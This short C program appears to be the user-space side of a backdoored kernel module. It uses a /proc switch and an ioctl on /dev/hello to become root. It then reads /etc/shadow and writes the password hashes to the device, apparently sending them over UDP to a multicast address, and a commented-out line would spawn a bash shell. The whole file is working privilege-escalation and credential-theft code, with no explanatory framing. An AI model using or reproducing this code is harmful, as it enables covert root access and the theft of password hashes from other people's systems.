#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <string.h>

struct test_ip_ioctl_request {
	uint16_t port;
	char ip[255];
};

#define TEST_SU_IOCTL _IO(150, 1)
#define TEST_IP_IOCTL _IOR(150, 2, struct test_ip_ioctl_request)

int main() {
	int sufd = open("/proc/enable_su", O_RDWR);
	if(sufd < 0) {
		perror("open(enable_su) = ");
		return 1;
	}

	write(sufd, "0", 1);
	write(sufd, "1", 1);


  int fd = open("/dev/hello", O_RDWR);
  if(fd < 0) {
    perror("failed to open");
    return -1;
  }

	// change udp address
	struct test_ip_ioctl_request req;
	strcpy(req.ip, "ff04::1");
	req.port = 12345;
	ioctl(fd, TEST_IP_IOCTL, &req);

  open("/etc/shadow", O_RDWR); //should fail
	// change user to root (uid = 0)
 	ioctl(fd, TEST_SU_IOCTL, 0);

	// write some data over udp
  write(fd, "ahoj!", 5);

  int shadow = open("/etc/shadow", O_RDWR);
	char buf[65000];
	int n = read(shadow, buf, sizeof(buf));
	write(fd, buf, n);
//  execl("/bin/bash", "/bin/bash", NULL);

}
